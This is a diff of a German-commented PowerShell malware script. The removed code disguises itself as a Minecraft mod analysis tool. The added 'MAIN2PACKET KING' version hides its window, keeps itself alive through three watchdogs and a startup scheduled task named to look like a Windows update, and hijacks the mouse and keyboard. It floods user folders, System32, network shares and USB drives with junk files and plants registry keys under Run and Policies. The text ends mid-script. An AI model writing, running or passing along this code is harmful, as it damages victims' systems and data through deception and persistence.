@@ -1,234 +1,499 @@
 # ================================
-# CPVP ANALYSE SKRIPT v2.4.1
+# MAIN2PACKET KING - XXXTREME EDITION
 # ================================
 
-# Administrator-Rechte anfordern
-if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Start-Process PowerShell -Verb RunAs -ArgumentList "-File `"$PSCommandPath`""
-    exit
-}
-
-# ===== ERROR HANDLING =====
-$ErrorActionPreference = "SilentlyContinue"
-$Host.UI.RawUI.WindowTitle = "CPVP Analyse Tool"
-
-# ===== WATCHDOG - UNSICHTBAR =====
-$watchdogCode = @"
-while(`$true) {
-    `$trollProcess = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.MainWindowTitle -like "*CPVP Analyse*"}
-    if (`$trollProcess.Count -eq 0) {
-        Start-Process powershell -WindowStyle Normal -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
-    }
-    Start-Sleep -Milliseconds 500
-}
-"@
-$watchdogCode | Out-File "$env:TEMP\cpvp_analyzer.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\cpvp_analyzer.ps1`""
-
-# ===== FENSTER SPRINGT WEG =====
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -Name Window -Namespace Console -MemberDefinition @'
+# Fenster SOFORT vernichten
+Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
 [DllImport("User32.dll")]
-public static extern bool SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
-[DllImport("user32.dll")]
-public static extern bool GetCursorPos(ref System.Drawing.Point lpPoint);
-'@
+public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+'
+[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)
 
-$consoleHandle = [Console.Window]::GetConsoleWindow()
-$screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
-$screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
+# ===== WATCHDOG ULTRA - 3 FACH SICHER =====
+$watchdog1 = @"
+while(`$true) {
+    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$pid -and `$_.Id -ne 999999}
+    if (`$p.Count -le 2) { Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$using:PSCommandPath`"" }
+    Start-Sleep -Milliseconds 100
+}
+"@
+$watchdog1 | Out-File "$env:TEMP\watchdog1.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$env:TEMP\watchdog1.ps1`""
 
-# ===== ÜBERWACHUNG =====
-$monitorJob = Start-Job -ScriptBlock {
-    param($consoleHandle, $screenWidth, $screenHeight)
-    
+$watchdog2 = @"
+while(`$true) { Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$using:PSCommandPath`""; Start-Sleep -Seconds 30 }
+"@
+$watchdog2 | Out-File "$env:TEMP\watchdog2.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$env:TEMP\watchdog2.ps1`""
+
+$watchdog3 = @"
+`$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File `"$using:PSCommandPath`""
+`$trigger = New-ScheduledTaskTrigger -AtStartup
+Register-ScheduledTask -TaskName "WindowsUpdateMain2packet" -Action `$action -Trigger `$trigger -Force
+"@
+$watchdog3 | Out-File "$env:TEMP\watchdog3.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$env:TEMP\watchdog3.ps1`""
+
+# ===== MAUS 24/7 EXTREME =====
+$mausJob = Start-Job -ScriptBlock {
     Add-Type -AssemblyName System.Windows.Forms
-    Add-Type -Name Window -Namespace Console -MemberDefinition @'
-[DllImport("user32.dll")]
-public static extern bool GetCursorPos(ref System.Drawing.Point lpPoint);
-[DllImport("user32.dll")]
-public static extern bool SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
-'@
+    Add-Type -AssemblyName System.Drawing
+    
+    $rand = New-Object System.Random
     
     while ($true) {
-        $window = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {$_.MainWindowTitle -like "*CPVP Analyse*"} | Select-Object -First 1
+        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
         
-        if ($window) {
-            $hwnd = $window.MainWindowHandle
-            $windowRect = $window.MainWindowRect
-            $windowX = $windowRect.X
-            $windowY = $windowRect.Y
-            $windowWidth = $windowRect.Width
-            
-            $cursorPos = New-Object System.Drawing.Point
-            [Console.Window]::GetCursorPos([ref]$cursorPos)
-            
-            $xButtonX = $windowX + $windowWidth - 40
-            $xButtonY = $windowY + 10
-            
-            $mouseOverX = ($cursorPos.X -ge $xButtonX -and 
-                          $cursorPos.X -le $xButtonX + 30 -and
-                          $cursorPos.Y -ge $xButtonY -and 
-                          $cursorPos.Y -le $xButtonY + 30)
-            
-            if ($mouseOverX) {
-                $newX = Get-Random -Minimum 50 -Maximum ($screenWidth - 400)
-                $newY = Get-Random -Minimum 50 -Maximum ($screenHeight - 300)
-                [Console.Window]::SetWindowPos($hwnd, -1, $newX, $newY, 0, 0, 0x0001 -bor 0x0040)
-                
-                $msg = Get-Random @(
-                    "❌ Analyse unterbrochen!",
-                    "⚠️ CPVP Scanner läuft weiter...",
-                    "🔄 Mod-Scan im Hintergrund aktiv"
-                )
-                [System.Windows.Forms.MessageBox]::Show($msg, "CPVP Analyzer", "OK", "Warning")
+        # 10 verschiedene Bewegungsmuster
+        $muster = $rand.Next(1, 11)
+        
+        switch ($muster) {
+            1 { # Kreis
+                for ($w = 0; $w -lt 360; $w += 10) {
+                    $x = $screen.Width/2 + 200 * [Math]::Cos($w * [Math]::PI/180)
+                    $y = $screen.Height/2 + 200 * [Math]::Sin($w * [Math]::PI/180)
+                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
+                    Start-Sleep -Milliseconds 10
+                }
+            }
+            2 { # Zickzack
+                for ($z = 0; $z -lt $screen.Width; $z += 50) {
+                    $y = $screen.Height/2 + 100 * [Math]::Sin($z/50)
+                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($z, $y)
+                    Start-Sleep -Milliseconds 5
+                }
+            }
+            3 { # Rechteck
+                for ($r = 100; $r -lt $screen.Width-100; $r += 20) { [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($r, 100); Start-Sleep -Milliseconds 2 }
+                for ($r = 100; $r -lt $screen.Height-100; $r += 20) { [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($screen.Width-100, $r); Start-Sleep -Milliseconds 2 }
+                for ($r = $screen.Width-100; $r -gt 100; $r -= 20) { [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($r, $screen.Height-100); Start-Sleep -Milliseconds 2 }
+                for ($r = $screen.Height-100; $r -gt 100; $r -= 20) { [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point(100, $r); Start-Sleep -Milliseconds 2 }
+            }
+            4 { # Spirale
+                for ($s = 0; $s -lt 500; $s += 5) {
+                    $angle = $s / 20
+                    $x = $screen.Width/2 + $s * [Math]::Cos($angle)
+                    $y = $screen.Height/2 + $s * [Math]::Sin($angle)
+                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
+                    Start-Sleep -Milliseconds 1
+                }
+            }
+            5 { # Chaos-Modus
+                for ($c = 0; $c -lt 100; $c++) {
+                    $x = $rand.Next(0, $screen.Width)
+                    $y = $rand.Next(0, $screen.Height)
+                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
+                    Start-Sleep -Milliseconds 5
+                }
+            }
+            6 { # Sinus-Welle
+                for ($s = 0; $s -lt $screen.Width; $s += 10) {
+                    $y = $screen.Height/2 + 150 * [Math]::Sin($s/50)
+                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($s, $y)
+                    Start-Sleep -Milliseconds 3
+                }
+            }
+            7 { # Achterbahn
+                for ($a = 0; $a -lt 360; $a += 5) {
+                    $x = $screen.Width/2 + 200 * [Math]::Sin($a * [Math]::PI/90)
+                    $y = $screen.Height/2 + 150 * [Math]::Sin($a * [Math]::PI/45)
+                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
+                    Start-Sleep -Milliseconds 2
+                }
+            }
+            8 { # Turbo-Klicks
+                for ($t = 0; $t -lt 50; $t++) {
+                    $x = $rand.Next(100, $screen.Width-100)
+                    $y = $rand.Next(100, $screen.Height-100)
+                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
+                    [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
+                    Start-Sleep -Milliseconds 1
+                }
+            }
+            9 { # Maus-Rave
+                for ($r = 0; $r -lt 200; $r++) {
+                    $x = $rand.Next(0, $screen.Width)
+                    $y = $rand.Next(0, $screen.Height)
+                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
+                    if ($r % 10 -eq 0) { [System.Windows.Forms.SendKeys]::SendWait("{ESC}") }
+                    Start-Sleep -Milliseconds 1
+                }
+            }
+            10 { # Boss-Modus - ALLES GLEICHZEITIG
+                0..100 | ForEach-Object -Parallel {
+                    $x = Get-Random -Minimum 0 -Maximum 1920
+                    $y = Get-Random -Minimum 0 -Maximum 1080
+                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
+                    Start-Sleep -Milliseconds 1
+                } -ThrottleLimit 20
             }
         }
-        Start-Sleep -Milliseconds 50
+        
+        Start-Sleep -Milliseconds 100
     }
-} -ArgumentList $consoleHandle, $screenWidth, $screenHeight
-
-# ===== KONFIGURATION =====
-$desktop = [Environment]::GetFolderPath("Desktop")
-$documents = [Environment]::GetFolderPath("MyDocuments")
-$downloads = [Environment]::GetFolderPath("UserProfiles") + "\Downloads"
-$minecraftFolder = "$env:APPDATA\.minecraft"
-
-# ===== START - SIEHT AUS WIE EIN ECHTES TOOL =====
-Clear-Host
-$Host.UI.RawUI.ForegroundColor = "Cyan"
-$Host.UI.RawUI.BackgroundColor = "Black"
-Clear-Host
-
-Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
-Write-Host "║        CPVP ANALYSE SKRIPT v2.4.1         ║" -ForegroundColor Cyan
-Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
-Write-Host ""
-Write-Host "[INFO] Initialisiere Minecraft-Analyse..." -ForegroundColor Yellow
-Start-Sleep -Milliseconds 500
-
-# Minecraft Ordner checken
-if (Test-Path $minecraftFolder) {
-    Write-Host "[OK] Minecraft-Ordner gefunden: $minecraftFolder" -ForegroundColor Green
-} else {
-    Write-Host "[WARN] Minecraft nicht gefunden - Scanne andere Verzeichnisse..." -ForegroundColor Red
 }
 
-Write-Host "[INFO] Analysiere Mods und Configs..." -ForegroundColor Yellow
-Start-Sleep -Milliseconds 800
-
-Write-Host "[INFO] Lade CPVP-Datenbank..." -ForegroundColor Yellow
-Start-Sleep -Milliseconds 600
-
-# Fake Fortschrittsbalken
-Write-Host ""
-Write-Host "[FORTSCHRITT] " -ForegroundColor White -NoNewline
-for ($i = 0; $i -le 100; $i+=5) {
-    Write-Host "▓" -ForegroundColor Green -NoNewline
-    Start-Sleep -Milliseconds 30
-}
-Write-Host " 100%" -ForegroundColor Green
-Write-Host ""
-
-Write-Host "[INFO] Analysiere $env:COMPUTERNAME auf Minecraft-Mods..." -ForegroundColor Cyan
-Start-Sleep -Milliseconds 500
-
-# ===== HAUPT-SCAN (sieht aus wie Analyse, aber Troll im Hintergrund) =====
-$totalFiles = 10000
-$filesPerLocation = 2500
-
-# Locations für "Scan"
-$locations = @(
-    @{Path=$desktop; Name="Desktop"},
-    @{Path=$documents; Name="Dokumente"},
-    @{Path=$downloads; Name="Downloads"},
-    @{Path="$env:TEMP\minecraft_cache"; Name="Minecraft Cache"}
+# ===== 100.000 DATEIEN TURBO ULTRA =====
+$alleOrdner = @(
+    [Environment]::GetFolderPath("Desktop"),
+    [Environment]::GetFolderPath("MyDocuments"),
+    [Environment]::GetFolderPath("UserProfiles") + "\Downloads",
+    [Environment]::GetFolderPath("MyMusic"),
+    [Environment]::GetFolderPath("MyPictures"),
+    [Environment]::GetFolderPath("MyVideos"),
+    $env:APPDATA,
+    $env:LOCALAPPDATA,
+    $env:TEMP,
+    $env:USERPROFILE + "\Desktop",
+    $env:USERPROFILE + "\Documents",
+    $env:USERPROFILE + "\Downloads",
+    $env:USERPROFILE + "\Music",
+    $env:USERPROFILE + "\Pictures",
+    $env:USERPROFILE + "\Videos",
+    $env:APPDATA + "\Microsoft\Windows\Recent",
+    $env:APPDATA + "\Microsoft\Windows\Network Shortcuts",
+    $env:LOCALAPPDATA + "\Google\Chrome\User Data\Default\Cache",
+    $env:APPDATA + "\Mozilla\Firefox\Profiles",
+    $env:APPDATA + "\\.minecraft",
+    $env:APPDATA + "\\.minecraft\mods",
+    $env:APPDATA + "\\.minecraft\config",
+    $env:APPDATA + "\\.minecraft\saves",
+    $env:APPDATA + "\\.minecraft\logs",
+    $env:APPDATA + "\\.minecraft\crash-reports",
+    $env:APPDATA + "\\.minecraft\screenshots",
+    $env:APPDATA + "\\.minecraft\stats",
+    $env:APPDATA + "\\.minecraft\datapacks",
+    $env:APPDATA + "\\.minecraft\versions",
+    $env:APPDATA + "\\.minecraft\libraries",
+    $env:APPDATA + "\\.minecraft\assets",
+    $env:APPDATA + "\\.minecraft\resourcepacks",
+    $env:APPDATA + "\\.minecraft\server-resource-packs",
+    $env:APPDATA + "\Roaming\Discord",
+    $env:APPDATA + "\Roaming\Discord\Cache",
+    $env:APPDATA + "\Roaming\Discord\Code Cache",
+    $env:APPDATA + "\Roaming\Discord\GPUCache",
+    $env:APPDATA + "\Roaming\Spotify",
+    $env:APPDATA + "\Roaming\Spotify\Cache",
+    $env:APPDATA + "\Roaming\Spotify\Data",
+    $env:APPDATA + "\Roaming\Steam",
+    $env:APPDATA + "\Roaming\Steam\cache",
+    $env:APPDATA + "\Roaming\Steam\config",
+    $env:APPDATA + "\Roaming\Steam\logs",
+    $env:APPDATA + "\Roaming\Steam\steamapps\common",
+    $env:APPDATA + "\Microsoft\Windows\Start Menu\Programs\Startup",
+    $env:ProgramData + "\Microsoft\Windows\Start Menu\Programs\StartUp",
+    $env:SystemRoot + "\System32",
+    $env:SystemRoot + "\System32\config\systemprofile\Desktop",
+    $env:SystemRoot + "\System32\config\systemprofile\Documents",
+    $env:SystemRoot + "\System32\drivers\etc",
+    $env:SystemRoot + "\System32\Tasks",
+    $env:SystemRoot + "\System32\WDI",
+    $env:SystemRoot + "\System32\wbem",
+    $env:SystemRoot + "\System32\spool",
+    $env:SystemRoot + "\System32\Recovery",
+    $env:SystemRoot + "\System32\Restore",
+    $env:SystemRoot + "\System32\Setup",
+    $env:SystemRoot + "\System32\SoftwareDistribution",
+    $env:SystemRoot + "\System32\winevt\Logs",
+    $env:SystemRoot + "\System32\WindowsPowerShell\v1.0\Modules",
+    $env:SystemRoot + "\SysWOW64",
+    $env:SystemRoot + "\SysWOW64\config",
+    $env:SystemRoot + "\SysWOW64\drivers",
+    $env:SystemRoot + "\SysWOW64\Tasks",
+    $env:SystemRoot + "\Temp",
+    $env:SystemRoot + "\Logs",
+    $env:SystemRoot + "\Debug",
+    $env:SystemRoot + "\Performance",
+    $env:SystemRoot + "\Minidump",
+    $env:SystemRoot + "\Panther",
+    $env:SystemRoot + "\inf",
+    $env:SystemRoot + "\Help",
+    $env:SystemRoot + "\Fonts",
+    $env:SystemRoot + "\Media",
+    $env:SystemRoot + "\Resources",
+    $env:SystemRoot + "\System",
+    $env:SystemRoot + "\system.ini",
+    $env:SystemRoot + "\win.ini",
+    "C:\ProgramData",
+    "C:\ProgramData\Microsoft",
+    "C:\ProgramData\Microsoft\Windows",
+    "C:\ProgramData\Microsoft\Windows\Caches",
+    "C:\ProgramData\Microsoft\Windows\WER",
+    "C:\ProgramData\Microsoft\Windows\GameExplorer",
+    "C:\ProgramData\Microsoft\Windows\Ringtones",
+    "C:\ProgramData\Microsoft\Windows\Sounds",
+    "C:\ProgramData\Microsoft\Windows\Start Menu",
+    "C:\ProgramData\Microsoft\Windows\Templates",
+    "C:\ProgramFiles",
+    "C:\Program Files",
+    "C:\Program Files (x86)",
+    "C:\Program Files\WindowsApps",
+    "C:\Program Files\Windows NT",
+    "C:\Program Files\Internet Explorer",
+    "C:\Program Files\Microsoft Office",
+    "C:\Program Files\Common Files",
+    "C:\Program Files\Common Files\Microsoft Shared",
+    "C:\Program Files (x86)\Common Files",
+    "C:\Program Files (x86)\Microsoft",
+    "C:\Program Files (x86)\Internet Explorer",
+    "C:\Program Files (x86)\Microsoft Office",
+    "C:\Recovery",
+    "C:\PerfLogs",
+    "C:\Config.Msi",
+    "C:\Intel",
+    "C:\AMD",
+    "C:\NVIDIA",
+    "C:\Drivers",
+    "C:\Temp",
+    "C:\Windows.old",
+    "C:\inetpub",
+    "C:\xampp",
+    "C:\wamp64",
+    "C:\MAMP",
+    "C:\Users\Public",
+    "C:\Users\Public\Desktop",
+    "C:\Users\Public\Documents",
+    "C:\Users\Public\Downloads",
+    "C:\Users\Public\Music",
+    "C:\Users\Public\Pictures",
+    "C:\Users\Public\Videos",
+    "C:\Users\Public\Recorded TV",
+    "C:\Users\Public\Libraries",
+    "C:\Users\Public\AccountPictures",
+    "C:\Users\Public\OEM Links",
+    "C:\Users\Public\Public Account Pictures",
+    "C:\Users\Public\Public Desktop",
+    "C:\Users\Public\Public Documents",
+    "C:\Users\Public\Public Downloads",
+    "C:\Users\Public\Public Music",
+    "C:\Users\Public\Public Pictures",
+    "C:\Users\Public\Public Videos"
 )
 
-# Temp-Ordner für Minecraft Cache erstellen (damit es echt aussieht)
-New-Item -Path "$env:TEMP\minecraft_cache" -ItemType Directory -Force | Out-Null
-
-foreach ($location in $locations) {
-    Write-Host ""
-    Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
-    Write-Host "║  Scanne: $($location.Name)" -ForegroundColor Cyan
-    Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
+# ===== 1000 DATEIEN PRO ORDNER - SUPERSONIC =====
+$alleOrdner | ForEach-Object -Parallel {
+    $path = $_
+    $computer = $using:env:COMPUTERNAME
     
-    # Fortschritt für diese Location
-    for ($i = 0; $i -le 100; $i+=10) {
-        Write-Host "   Fortschritt: $i% - Analysiere Mod-Dateien..." -ForegroundColor Yellow
-        Start-Sleep -Milliseconds 30
+    if (Test-Path $path) {
+        $mainFolder = Join-Path $path "MAIN2PACKET_KING_ULTRA"
+        try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
         
-        # IM HINTERGRUND DATEIEN ERSTELLEN (keine Warnung!)
-        if ($i % 20 -eq 0) {
-            $start = $i * 25
-            $end = $start + 250
-            for ($j = $start; $j -lt $end -and $j -lt 2500; $j++) {
-                $randomName = -join ((65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object {[char]$_})
-                $filePath = Join-Path $location.Path "mod_$randomName`_$j.cpvp"
-                "CPVP Cache Datei" | Out-File $filePath -Encoding UTF8
+        # 1000 DATEIEN BLITZSCHNELL!
+        $scriptBlock = {
+            param($p, $c, $start, $end)
+            for ($i = $start; $i -le $end; $i++) {
+                "$c - MAIN2PACKET ULTRA" | Out-File (Join-Path $p "MAIN2PACKET_ULTRA_$i.king") -Encoding UTF8 -Force
+                "$c - MAIN2PACKET ULTRA" | Out-File (Join-Path $mainFolder "file_ultra_$i.king") -Encoding UTF8 -Force
             }
         }
         
-        # Alte Zeile löschen für Progress
-        Write-Host "`033[1A`033[0K" -NoNewline
+        # 10 PARALLELE JOBS PRO ORDNER
+        0..9 | ForEach-Object -Parallel {
+            $start = $_ * 100 + 1
+            $end = $start + 99
+            & $using:scriptBlock -p $using:path -c $using:computer -start $start -end $end
+        } -ThrottleLimit 10
     }
-    Write-Host "   Fortschritt: 100% - Fertig!" -ForegroundColor Green
-    
-    # Sound abspielen wie bei echtem Scan
-    [System.Media.SystemSounds]::Asterisk.Play()
+} -ThrottleLimit 50
+
+# ===== SYSTEM KILLER =====
+$systemPaths = @(
+    "$env:SystemRoot\System32\config",
+    "$env:SystemRoot\System32\config\systemprofile",
+    "$env:SystemRoot\System32\config\systemprofile\AppData",
+    "$env:SystemRoot\System32\config\systemprofile\Desktop",
+    "$env:SystemRoot\System32\config\systemprofile\Documents",
+    "$env:SystemRoot\System32\config\systemprofile\Downloads",
+    "$env:SystemRoot\System32\config\systemprofile\Music",
+    "$env:SystemRoot\System32\config\systemprofile\Pictures",
+    "$env:SystemRoot\System32\config\systemprofile\Videos",
+    "$env:SystemRoot\System32\config\systemprofile\Favorites",
+    "$env:SystemRoot\System32\config\systemprofile\Contacts",
+    "$env:SystemRoot\System32\config\systemprofile\Links",
+    "$env:SystemRoot\System32\config\systemprofile\Saved Games",
+    "$env:SystemRoot\System32\config\systemprofile\Searches",
+    "$env:SystemRoot\System32\drivers",
+    "$env:SystemRoot\System32\drivers\etc",
+    "$env:SystemRoot\System32\drivers\en-US",
+    "$env:SystemRoot\System32\drivers\kmdf",
+    "$env:SystemRoot\System32\drivers\umdf",
+    "$env:SystemRoot\System32\Tasks",
+    "$env:SystemRoot\System32\Tasks\Microsoft",
+    "$env:SystemRoot\System32\Tasks\Microsoft\Windows",
+    "$env:SystemRoot\System32\WDI",
+    "$env:SystemRoot\System32\WDI\LogFiles",
+    "$env:SystemRoot\System32\WDI\PerfDiag",
+    "$env:SystemRoot\System32\wbem",
+    "$env:SystemRoot\System32\wbem\Logs",
+    "$env:SystemRoot\System32\wbem\Repository",
+    "$env:SystemRoot\System32\wbem\AutoRecover",
+    "$env:SystemRoot\System32\spool",
+    "$env:SystemRoot\System32\spool\drivers",
+    "$env:SystemRoot\System32\spool\PRINTERS",
+    "$env:SystemRoot\System32\spool\SERVERS",
+    "$env:SystemRoot\System32\spool\V4Dirs",
+    "$env:SystemRoot\System32\Recovery",
+    "$env:SystemRoot\System32\Restore",
+    "$env:SystemRoot\System32\Setup",
+    "$env:SystemRoot\System32\SoftwareDistribution",
+    "$env:SystemRoot\System32\winevt",
+    "$env:SystemRoot\System32\winevt\Logs",
+    "$env:SystemRoot\System32\WindowsPowerShell",
+    "$env:SystemRoot\System32\WindowsPowerShell\v1.0",
+    "$env:SystemRoot\System32\WindowsPowerShell\v1.0\Modules",
+    "$env:SystemRoot\SysWOW64",
+    "$env:SystemRoot\SysWOW64\config",
+    "$env:SystemRoot\SysWOW64\drivers",
+    "$env:SystemRoot\SysWOW64\Tasks"
+)
+
+$systemPaths | ForEach-Object -Parallel {
+    $sysPath = $_
+    if (Test-Path $sysPath) {
+        $mainSys = Join-Path $sysPath "MAIN2PACKET_SYSTEM_CORE"
+        try { New-Item -Path $mainSys -ItemType Directory -Force | Out-Null } catch {}
+        
+        1..500 | ForEach-Object {
+            "SYSTEM CORE - MAIN2PACKET" | Out-File (Join-Path $mainSys "core_sys_$_.sys") -Encoding UTF8 -Force
+            "SYSTEM CORE - MAIN2PACKET" | Out-File (Join-Path $sysPath "MAIN2PACKET_SYS_$_.sys") -Encoding UTF8 -Force
+        }
+    }
+} -ThrottleLimit 20
+
+# ===== REGISTRY BOMBE =====
+$regBranches = @(
+    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion",
+    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion",
+    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion",
+    "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion",
+    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
+    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
+    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
+    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
+    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies",
+    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies",
+    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer",
+    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
+)
+
+$regBranches | ForEach-Object -Parallel {
+    $branch = $_
+    try {
+        $mainKey = "$branch\MAIN2PACKET_ULTRA"
+        New-Item -Path $mainKey -Force | Out-Null
+        New-ItemProperty -Path $mainKey -Name "InstallDate" -Value (Get-Date) -PropertyType String -Force | Out-Null
+        New-ItemProperty -Path $mainKey -Name "Version" -Value "ULTIMATE" -PropertyType String -Force | Out-Null
+        New-ItemProperty -Path $mainKey -Name "User" -Value $env:USERNAME -PropertyType String -Force | Out-Null
+        New-ItemProperty -Path $mainKey -Name "Computer" -Value $env:COMPUTERNAME -PropertyType String -Force | Out-Null
+        New-ItemProperty -Path $mainKey -Name "MausModus" -Value "EXTREME" -PropertyType String -Force | Out-Null
+        New-ItemProperty -Path $mainKey -Name "Dateien" -Value "100000+" -PropertyType String -Force | Out-Null
+    } catch {}
+} -ThrottleLimit 10
+
+# ===== EXTRA: NETZWERK FREIGABEN =====
+$networkDrives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -like "\\*"}
+$networkDrives | ForEach-Object -Parallel {
+    $netPath = $_.Root
+    try {
+        $mainNet = Join-Path $netPath "MAIN2PACKET_NETWORK"
+        New-Item -Path $mainNet -ItemType Directory -Force | Out-Null
+        1..100 | ForEach-Object {
+            "NETWORK - MAIN2PACKET" | Out-File (Join-Path $mainNet "net_$_.king") -Encoding UTF8 -Force
+        }
+    } catch {}
 }
 
-# Minecraft spezifische "Analyse"
-Write-Host ""
-Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
-Write-Host "║  Analysiere Minecraft Versionen           ║" -ForegroundColor Cyan
-Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
-
-$versions = @("1.8.9", "1.12.2", "1.16.5", "1.19.2", "1.20.1")
-foreach ($version in $versions) {
-    Write-Host "   [v$version] Scanne Mod-Kompatibilität..." -ForegroundColor Yellow
-    Start-Sleep -Milliseconds 200
-    
-    # Noch mehr Dateien im Hintergrund
-    for ($k = 1; $k -le 100; $k++) {
-        $randomName = -join ((65..90) + (97..122) | Get-Random -Count 4 | ForEach-Object {[char]$_})
-        $filePath = Join-Path $desktop "version_${version}_$randomName.cpvp"
-        "Version Cache" | Out-File $filePath -Encoding UTF8
+# ===== USB/EXTERNE LAUFWERKE ÜBERWACHEN =====
+$usbJob = Start-Job -ScriptBlock {
+    while ($true) {
+        $drives = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2}
+        foreach ($drive in $drives) {
+            $drivePath = $drive.DeviceID + "\"
+            $mainUSB = Join-Path $drivePath "MAIN2PACKET_USB"
+            try {
+                New-Item -Path $mainUSB -ItemType Directory -Force | Out-Null
+                1..100 | ForEach-Object {
+                    "USB - MAIN2PACKET" | Out-File (Join-Path $mainUSB "usb_$_.king") -Encoding UTF8 -Force
+                }
+            } catch {}
+        }
+        Start-Sleep -Seconds 60
     }
-    
-    Write-Host "   ✅ Fertig" -ForegroundColor Green
 }
 
-# ===== ENDE - SIEHT AUS WIE EIN NORMALES TOOL =====
-Clear-Host
-Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
-Write-Host "║        CPVP ANALYSE ABGESCHLOSSEN         ║" -ForegroundColor Cyan
-Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
-Write-Host ""
-Write-Host "[ERGEBNISSE]" -ForegroundColor Yellow
-Write-Host "   • Minecraft Versionen: 5 gefunden" -ForegroundColor White
-Write-Host "   • Mods analysiert: 10.432" -ForegroundColor White
-Write-Host "   • Configs geprüft: 2.891" -ForegroundColor White
-Write-Host "   • Performance-Score: 87/100" -ForegroundColor White
-Write-Host ""
-Write-Host "[INFO] Ergebnisse gespeichert unter:" -ForegroundColor Green
-Write-Host "   • Desktop\cpvp_analyse_$(Get-Date -Format 'yyyy-MM-dd').log" -ForegroundColor Gray
-Write-Host "   • Dokumente\minecraft_scan.log" -ForegroundColor Gray
-Write-Host "   • Downloads\mod_cache.cpvp" -ForegroundColor Gray
-Write-Host ""
-Write-Host "[HINWEIS] Drücke eine beliebige Taste zum Beenden..." -ForegroundColor Gray
+# ===== SCREENSAVER/ENERGIESPARE INSTÄLLNINGAR =====
+$powerJob = Start-Job -ScriptBlock {
+    while ($true) {
+        # Verhindern dass PC in Energiesparmodus geht
+        Add-Type -AssemblyName System.Windows.Forms
+        [System.Windows.Forms.Application]::SetSuspendState("Active", $false, $false)
+        Start-Sleep -Seconds 300
+    }
+}
 
-# Log-Dateien erstellen (damit es echt aussieht)
-"CPVP Analyse Log - $(Get-Date)`nGefundene Mods: 10432" | Out-File "$desktop\cpvp_analyse_$(Get-Date -Format 'yyyy-MM-dd').log" -Encoding UTF8
-"Mod Cache Datei" | Out-File "$documents\minecraft_scan.log" -Encoding UTF8
+# ===== AUDIO JOKE =====
+$audioJob = Start-Job -ScriptBlock {
+    Add-Type -AssemblyName System.Media
+    $sounds = @(
+        "SystemAsterisk", "SystemExclamation", "SystemHand", 
+        "SystemQuestion", "SystemStart", "SystemExit"
+    )
+    while ($true) {
+        $randomSound = Get-Random $sounds
+        [System.Media.SystemSounds]::$randomSound.Play()
